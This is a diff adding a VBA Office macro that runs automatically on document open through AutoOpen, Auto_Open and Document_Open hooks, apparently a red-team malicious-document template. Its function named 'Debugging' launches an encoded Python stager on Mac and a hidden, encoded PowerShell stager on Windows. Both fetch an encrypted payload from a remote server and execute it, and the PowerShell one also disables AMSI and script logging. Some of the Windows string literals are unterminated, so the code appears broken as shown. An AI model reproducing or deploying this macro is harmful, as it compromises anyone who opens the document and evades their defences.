@@ -1,0 +1,315 @@
+#If Mac Then
+
+    #If VBA7 Then
+
+        Private Declare PtrSafe Function system Lib "libc.dylib" (ByVal command As String) As Long
+
+    #Else
+
+        Private Declare Function system Lib "libc.dylib" (ByVal command As String) As Long
+
+    #End If
+
+#End If
+
+
+
+Sub AutoOpen()
+
+    'MsgBox("AutoOpen()")
+
+    Debugging
+
+End Sub
+
+
+
+Sub Auto_Open()
+
+    'MsgBox("Auto_Open()")
+
+    Debugging
+
+End Sub
+
+
+
+Sub Document_Open()
+
+    'MsgBox("Document_Open()")
+
+    Debugging
+
+End Sub
+
+
+
+Public Function Debugging() As Variant
+
+    On Error Resume Next
+
+            Dim tracking As String
+
+            tracking = "http://127.0.0.1/tracking?source="
+
+            #If Mac Then
+
+                'Mac Rendering
+
+                If Val(Application.Version) < 15 Then 'Mac Office 2011
+
+                    system ("curl " & tracking & "Mac2011")
+
+                Else 'Mac Office 2016
+
+                    system ("curl " & tracking & "Mac2016")
+
+                End If
+
+                Dim result As Long
+
+                Dim str As String
+
+                str = "aW1wb3J0IHN5czsKaW1wb3J0IHJlLCBzdWJwcm9jZXNzOwpjbWQgPS"
+
+		str = str + "AicHMgLWVmIHwgZ3JlcCBMaXR0bGVcIFNuaXRjaCB8IGdyZX"
+
+		str = str + "AgLXYgZ3JlcCIKcHMgPSBzdWJwcm9jZXNzLlBvcGVuKGNtZC"
+
+		str = str + "wgc2hlbGw9VHJ1ZSwgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRS"
+
+		str = str + "wgc3RkZXJyPXN1YnByb2Nlc3MuUElQRSkKb3V0LCBlcnIgPS"
+
+		str = str + "Bwcy5jb21tdW5pY2F0ZSgpOwppZiByZS5zZWFyY2goIkxpdH"
+
+		str = str + "RsZSBTbml0Y2giLCBvdXQuZGVjb2RlKCdVVEYtOCcpKToKIC"
+
+		str = str + "Agc3lzLmV4aXQoKTsKCmltcG9ydCB1cmxsaWIucmVxdWVzdD"
+
+		str = str + "sKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV0"
+
+		str = str + "9XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2"
+
+		str = str + "tvJztzZXJ2ZXI9J2h0dHA6Ly8xMC4wLjIuNjo4MCc7dD0nL2"
+
+		str = str + "FkbWluL2dldC5waHAnOwpyZXE9dXJsbGliLnJlcXVlc3QuUm"
+
+		str = str + "VxdWVzdChzZXJ2ZXIrdCk7CnByb3h5ID0gdXJsbGliLnJlcX"
+
+		str = str + "Vlc3QuUHJveHlIYW5kbGVyKCk7Cm8gPSB1cmxsaWIucmVxdW"
+
+		str = str + "VzdC5idWlsZF9vcGVuZXIocHJveHkpOwpvLmFkZGhlYWRlcn"
+
+		str = str + "M9WygnVXNlci1BZ2VudCcsVUEpLCAoIkNvb2tpZSIsICJzZX"
+
+		str = str + "NzaW9uPWxPZitqNzVYME1EdDNLeVIydEVkQ1hkbVhiWT0iKV"
+
+		str = str + "07CnVybGxpYi5yZXF1ZXN0Lmluc3RhbGxfb3BlbmVyKG8pOw"
+
+		str = str + "phPXVybGxpYi5yZXF1ZXN0LnVybG9wZW4ocmVxKS5yZWFkKC"
+
+		str = str + "k7CklWPWFbMDo0XTsKZGF0YT1hWzQ6XTsKa2V5PUlWKydJfW"
+
+		str = str + "NpcHw8eSVnNnZHO1hXPUY+Iyg6UiZPIThTXUVyPycuZW5jb2"
+
+		str = str + "RlKCdVVEYtOCcpOwpTLGosb3V0PWxpc3QocmFuZ2UoMjU2KS"
+
+		str = str + "ksMCxbXTsKZm9yIGkgaW4gbGlzdChyYW5nZSgyNTYpKToKIC"
+
+		str = str + "AgIGo9KGorU1tpXStrZXlbaSVsZW4oa2V5KV0pJTI1NjsKIC"
+
+		str = str + "AgIFNbaV0sU1tqXT1TW2pdLFNbaV07Cmk9aj0wOwpmb3IgY2"
+
+		str = str + "hhciBpbiBkYXRhOgogICAgaT0oaSsxKSUyNTY7CiAgICBqPS"
+
+		str = str + "hqK1NbaV0pJTI1NjsKICAgIFNbaV0sU1tqXT1TW2pdLFNbaV"
+
+		str = str + "07CiAgICBvdXQuYXBwZW5kKGNocihjaGFyXlNbKFNbaV0rU1"
+
+		str = str + "tqXSklMjU2XSkpOwpleGVjKCcnLmpvaW4ob3V0KSk7"
+
+                'MsgBox("echo ""import sys,base64;exec(base64.b64decode(\"" " & str & " \""));"" | python3 &")
+
+                result = system("echo ""import sys,base64;exec(base64.b64decode(\"" " & str & " \""));"" | python3 &")
+
+            #Else
+
+                'Windows Rendering
+
+                Dim objWeb As Object
+
+                Set objWeb = CreateObject("Microsoft.XMLHTTP")
+
+                objWeb.Open "GET", tracking & "Windows", False
+
+                objWeb.send
+
+                Dim Str As String
+
+		str = "powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVg
+
+		str = str + "BlAHIAcwBpAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBp
+
+		str = str + "AG8AbgAuAE0AYQBqAG8AcgAgAC0AZwBlACAAMwApAHsAJABSAG
+
+		str = str + "UAZgA9AFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcA
+
+		str = str + "ZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQ
+
+		str = str + "BnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBB
+
+		str = str + "AG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBlAH
+
+		str = str + "QARgBpAGUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkA
+
+		str = str + "bABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQ
+
+		str = str + "B0AGkAYwAnACkALgBTAGUAdAB2AGEAbAB1AGUAKAAkAE4AdQBs
+
+		str = str + "AGwALAAkAHQAcgB1AGUAKQA7AFsAUwB5AHMAdABlAG0ALgBEAG
+
+		str = str + "kAYQBnAG4AbwBzAHQAaQBjAHMALgBFAHYAZQBuAHQAaQBuAGcA
+
+		str = str + "LgBFAHYAZQBuAHQAUAByAG8AdgBpAGQAZQByAF0ALgBHAGUAdA
+
+		str = str + "BGAGkAZQBsAGQAKAAnAG0AXwBlAG4AYQBiAGwAZQBkACcALAAn
+
+		str = str + "AE4AbwBuAFAAdQBiAGwAaQBjACwASQBuAHMAdABhAG4AYwBlAC
+
+		str = str + "cAKQAuAFMAZQB0AFYAYQBsAHUAZQAoAFsAUgBlAGYAXQAuAEEA
+
+		str = str + "cwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQ
+
+		str = str + "BzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0
+
+		str = str + "AG8AbQBhAHQAaQBvAG4ALgBUAHIAYQBjAGkAbgBnAC4AUABTAE
+
+		str = str + "UAdAB3AEwAbwBnAFAAcgBvAHYAaQBkAGUAcgAnACkALgBHAGUA
+
+		str = str + "dABGAGkAZQBsAGQAKAAnAGUAdAB3AFAAcgBvAHYAaQBkAGUAcg
+
+		str = str + "AnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBj
+
+		str = str + "ACcAKQAuAEcAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAApAC
+
+		str = str + "wAMAApADsAfQA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMA
+
+		str = str + "ZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQ
+
+		str = str + "A6ADoARQB4AHAAZQBjAHQAMQAwADAAQwBvAG4AdABpAG4AdQBl
+
+		str = str + "AD0AMAA7ACQAdwBjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAF
+
+		str = str + "MAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4A
+
+		str = str + "dAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKA
+
+		str = str + "BXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBX
+
+		str = str + "ADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAH
+
+		str = str + "YAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcA
+
+		str = str + "OwAkAHMAZQByAD0AJAAoAFsAVABlAHgAdAAuAEUAbgBjAG8AZA
+
+		str = str + "BpAG4AZwBdADoAOgBVAG4AaQBjAG8AZABlAC4ARwBlAHQAUwB0
+
+		str = str + "AHIAaQBuAGcAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG
+
+		str = str + "8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAYQBBAEIA
+
+		str = str + "MABBAEgAUQBBAGMAQQBBADYAQQBDADgAQQBMAHcAQQB4AEEARA
+
+		str = str + "BBAEEATABnAEEAdwBBAEMANABBAE0AZwBBAHUAQQBEAFkAQQBP
+
+		str = str + "AGcAQQA0AEEARABBAEEAJwApACkAKQA7ACQAdAA9ACcALwBuAG
+
+		str = str + "UAdwBzAC4AcABoAHAAJwA7ACQAdwBjAC4ASABlAGEAZABlAHIA
+
+		str = str + "cwAuAEEAZABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALA
+
+		str = str + "AkAHUAKQA7ACQAdwBjAC4AUAByAG8AeAB5AD0AWwBTAHkAcwB0
+
+		str = str + "AGUAbQAuAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdAD
+
+		str = str + "oAOgBEAGUAZgBhAHUAbAB0AFcAZQBiAFAAcgBvAHgAeQA7ACQA
+
+		str = str + "dwBjAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbA
+
+		str = str + "BzACAAPQAgAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAEMAcgBl
+
+		str = str + "AGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAG
+
+		str = str + "EAdQBsAHQATgBlAHQAdwBvAHIAawBDAHIAZQBkAGUAbgB0AGkA
+
+		str = str + "YQBsAHMAOwAkAFMAYwByAGkAcAB0ADoAUAByAG8AeAB5ACAAPQ
+
+		str = str + "AgACQAdwBjAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAcwB0
+
+		str = str + "AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6AD
+
+		str = str + "oAQQBTAEMASQBJAC4ARwBlAHQAQgB5AHQAZQBzACgAJwBJAH0A
+
+		str = str + "YwBpAHAAfAA8AHkAJQBnADYAdgBHADsAWABXAD0ARgA+ACMAKA
+
+		str = str + "A6AFIAJgBPACEAOABTAF0ARQByAD8AJwApADsAJABSAD0AewAk
+
+		str = str + "AEQALAAkAEsAPQAkAEEAcgBnAHMAOwAkAFMAPQAwAC4ALgAyAD
+
+		str = str + "UANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsA
+
+		str = str + "JABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAG8AdQ
+
+		str = str + "BuAHQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBb
+
+		str = str + "ACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9AD
+
+		str = str + "sAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYA
+
+		str = str + "OwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANg
+
+		str = str + "A7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAk
+
+		str = str + "AEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AYgB4AG8AcgAkAF
+
+		str = str + "MAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIA
+
+		str = str + "NQA2AF0AfQB9ADsAJAB3AGMALgBIAGUAYQBkAGUAcgBzAC4AQQ
+
+		str = str + "BkAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAHkASQBjAFoAZgB6
+
+		str = str + "AEkAaQBOAG4AZQBZAFYAPQA2AHYAaABqAHkALwByAE4ASQBNAE
+
+		str = str + "oANwBxAFkAMwBYAHgAMwBOAFMASgBSAEQAcABMAFUAOAA9ACIA
+
+		str = str + "KQA7ACQAZABhAHQAYQA9ACQAdwBjAC4ARABvAHcAbgBsAG8AYQ
+
+		str = str + "BkAEQAYQB0AGEAKAAkAHMAZQByACsAJAB0ACkAOwAkAGkAdgA9
+
+		str = str + "ACQAZABhAHQAYQBbADAALgAuADMAXQA7ACQAZABhAHQAYQA9AC
+
+		str = str + "QAZABhAHQAYQBbADQALgAuACQAZABhAHQAYQAuAGwAZQBuAGcA
+
+		str = str + "dABoAF0AOwAtAGoAbwBpAG4AWwBDAGgAYQByAFsAXQBdACgAJg
+
+		str = str + "AgACQAUgAgACQAZABhAHQAYQAgACgAJABJAFYAKwAkAEsAKQAp
+
+		str = str + "AHwASQBFAFgA
+
+                'MsgBox(str)
+
+                Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+
+                Set objStartup = objWMIService.Get("Win32_ProcessStartup")
+
+                Set objConfig = objStartup.SpawnInstance_
+
+                objConfig.ShowWindow = 0
+
+                Set objProcess = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
+
+                objProcess.Create str, Null, objConfig, intProcessID
+
+            #End If
+
+End Function
